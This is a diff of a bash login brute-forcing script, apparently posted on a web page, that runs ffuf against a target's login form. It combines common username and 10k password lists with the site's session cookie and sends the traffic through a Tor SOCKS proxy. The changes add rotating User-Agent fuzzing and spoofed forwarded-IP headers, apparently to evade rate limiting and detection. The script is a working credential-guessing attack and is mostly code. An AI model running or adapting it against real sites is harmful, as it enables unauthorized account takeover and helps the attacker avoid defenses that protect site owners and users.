@@ -51,6 +51,7 @@ if [ $# -lt 1 ]; then
 fi
 
 URL="$1"
+UI="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
 <strong>USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 </strong>PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"
@@ -157,7 +158,6 @@ DATA="${USERNAME_FIELD}=FUZZ1&#x26;${PASSWORD_FIELD}=FUZZ2"
 COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')
 
 HEADERS=(
-  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
   -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
   -H "Accept-Language: en-US,fa-IR;q=0.5"
   -H "Accept-Encoding: gzip, deflate"
@@ -177,17 +177,21 @@ if [[ "$METHOD" == "get" ]]; then
     ffuf -u "$FFUF_URL" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
+         -w "$UI:FUZZ3" \
          -x "socks4://127.0.0.1:16379" \
          -X GET \
          -ac -c -r -mc 200 \
+         -H "User-Agent:FUZZ3" \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
+         -w "$UI:FUZZ3" \
          -x "socks4://127.0.0.1:16379" \
          -X POST -d "$DATA" \
          -ac -c -r -mc 200 \
+         -H "User-Agent:FUZZ3" \
          "${HEADERS[@]}"
 fi
 </code></pre>
@@ -229,6 +233,7 @@ if [ $# -lt 1 ]; then
 fi
 
 URL="$1"
+UI="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
 USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"
@@ -335,8 +340,6 @@ DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
 COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')
 
 HEADERS=(
-  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
-  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
   -H "Accept-Language: en-US,fa-IR;q=0.5"
   -H "Accept-Encoding: gzip, deflate"
   -H "Content-Type: application/x-www-form-urlencoded"
@@ -405,21 +408,23 @@ if [[ "$METHOD" == "get" ]]; then
     ffuf -u "$FFUF_URL" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$FORWARDED:FUZZ3" \
+         -w "$UI:FUZZ3" \
+         -w "$FORWARDED:FUZZ4" \
          -x "socks4://127.0.0.1:16379" \
          -X GET \
          -ac -c -r -mc 200 \
-         -H "FUZZ3" \
+         -H "FUZZ4" \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$FORWARDED:FUZZ3" \
+         -w "$UI:FUZZ3" \
+         -w "$FORWARDED:FUZZ4" \
          -x "socks4://127.0.0.1:16379" \
          -X POST -d "$DATA" \
          -ac -c -r -mc 200 \
-         -H "FUZZ3 127.0.0.1" \
+         -H "FUZZ4" \
          "${HEADERS[@]}"
 fi
 ```
